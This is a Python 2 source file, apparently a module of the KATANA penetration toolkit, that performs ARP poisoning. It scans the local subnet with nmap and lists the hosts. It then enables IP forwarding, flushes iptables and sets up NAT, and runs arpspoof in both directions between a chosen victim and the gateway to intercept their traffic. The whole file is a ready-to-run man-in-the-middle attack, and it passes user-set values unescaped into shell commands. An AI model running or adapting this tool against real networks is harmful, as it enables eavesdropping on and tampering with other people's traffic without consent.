# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                       #
# Module    : ARP Poisoning     #
# Script by : RedToor           #
# Date      : 26/08/2015        #
# Version   : 2.1               #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                   #
from core.design import *       #
from core.Setting import *      #
from core import Errors         #
from core import help           #
from core import ping           #
import sys                      #
d=DESIGN()                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                     #
from xml.dom import minidom
import xml.etree.ElementTree as ET
import multiprocessing
import commands         
import re
import commands
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaultipv="192.168.1.215" #MY_IP
defaultgat="192.168.1.254" #
defaultint="wlan0"         #INTERFACE_DEVICE
IPs=[]
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
def run(para,parb,parc):
    global defaultgat,defaultipv,defaultint
    defaultipv=para
    defaultgat=parb
    defaultint=parc
    arpp(1)

def arpp(run): 
    try:
        global defaultgat,defaultipv,defaultint
        if run!=1:
            actions=raw_input(d.prompt("net/arpspoof"))
        else:
            actions="run"
        if actions == "show options" or actions == "sop":
            d.option()
            d.descrip("target","yes","IP victim",defaultipv)
            d.descrip("gway","yes","Gateway-Router.",defaultgat)
            d.descrip("iterce","yes","Interface",defaultint)
            d.helpAUX()
            if ping.conneted()!=False:
                ping.interfaces(1)
                ping.get_gateway(1)
                ping.my_mac_address(1)
                d.space()
                if ping.conneted()!=False:
                    commands.getoutput(NMAP_PATH+' -sn '+str(ping.myip())+'/24 -oX tmp/ips.xml > null')
                    GateWay=ping.get_gateway(2)
                    tree = ET.parse('tmp/ips.xml')
                    root = tree.getroot()
                    IPf=0
                    counter=0
                    IP=""
                    for host in root.findall('host'):
                        for hosted in host.findall('address'):
                            if hosted.get('addrtype') == "ipv4":
                                IPf=hosted.get('addr')
                            else:
                                if GateWay == IPf :
                                    IPf=colors[8]+colors[4]+"{GW:"+IPf+"}"+colors[0]
                                IPs.append(" "+IPf+" "+str(hosted.get('addr'))+" "+str(hosted.get('vendor')))
                    print " "+colors[10]+colors[7]+" # \t IP \t\t MAC \t\t VENDOR         "+colors[0]

                    for HOST in IPs:
                        counter=counter+1               
                        print " ["+str(counter)+"]"+HOST
                    d.space()
                    commands.getoutput('rm tmp/ips.xml > null')
            else:
                print d.noconnect()
            print ""
            arpp(0)
        elif actions[0:10] == "set target":
            defaultipv=ping.update(defaultipv,actions,"target")
            d.change("target",defaultipv)
        elif actions[0:8] == "set gway":
            defaultgat=ping.update(defaultgat,actions,"gway")
            d.change("gway",defaultgat)
        elif actions[0:10] == "set iterce":
            defaultint=ping.update(defaultint,actions,"iterce")
            d.change("iterce",defaultint)
        elif actions=="exit" or actions=="x":
            d.goodbye()
            exit()
        elif actions=="help" or actions=="h":
            help.help()
        elif actions=="back" or actions=="b":
            return
            return
        elif actions[0:5]=="save:":
            ping.SaveVariable(secuence=actions, matrix=IPs)
        elif actions=="run"  or actions=="r":
            d.run()
            try:
		My_Ip=ping.myip()
		Tables="""
iptables --flush;
iptables --zero;
iptables --delete-chain;
iptables -F -t nat;
iptables --append FORWARD --in-interface """+defaultint+""" --jump ACCEPT;
iptables --table nat --append POSTROUTING --out-interface """+defaultint+""";
"""

                print " "+Alr+" Ensure the victim recieves packets by forwarding them",ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
                print " "+Alr+" Configuring IPtables NAT",ping.status_cmd(Tables,'\t\t\t\t')
                print " "+Alr+" Starting ARP Poisoning..."
                try:
                    z=multiprocessing.Process(target=Get_PoisoningTTG)
                    t=multiprocessing.Process(target=Get_PoisoningTGT)
                    t.start()
                    z.start()
                    NULL=raw_input(" "+Hlp+" Stop Attack ARP (PRESS ANY KEY)")
                    print " "+Alr+" Stopping ARP Poisoning...", ping.status_cmd('killall arpspoof','\t\t\t\t')
                    print " "+Alr+" Setting Normal configuration in forwarding",ping.status_cmd('echo 0 > /proc/sys/net/ipv4/ip_forward','\t\t')
                    t.terminate()
                    z.terminate()  
                    d.space()
                    arpp(0)
                except:
                    Errors.Errors(event=sys.exc_info(), info=False)
            except:
                Errors.Errors(event=sys.exc_info(), info=False)
        else:
            d.No_actions()
    except:
        Errors.Errors(event=sys.exc_info(), info=False)
    arpp(0)

def Get_PoisoningTTG():
    commands.getoutput("arpspoof -i "+defaultint+" -t "+defaultipv+" "+defaultgat)
def Get_PoisoningTGT():
    commands.getoutput("arpspoof -i "+defaultint+" -t "+defaultgat+" "+defaultipv)




